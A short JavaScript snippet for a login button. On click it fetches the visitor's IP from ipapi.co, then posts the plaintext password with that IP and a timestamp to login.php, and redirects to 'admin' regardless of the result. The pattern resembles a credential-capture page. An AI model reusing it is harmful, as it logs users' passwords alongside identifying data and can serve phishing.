var send = document.getElementById("send");
var pass;
var user;

send.addEventListener("click", function() {
    var today = new Date();
    var time = today.getDate() +'-'+(today.getMonth()+1)+'-'+ today.getFullYear() + " | " + today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
    
    $.getJSON('https://ipapi.co/json/', function(data) {
        user = JSON.parse(JSON.stringify(data));
        console.log(user);
        console.log(user.ip);

        pass = document.getElementById("password").value;
    
        $.post("login.php", {pass:pass, time:time, ip:user.ip});
    });
    setInterval(function(){ window.location="admin"; }, 3000);
});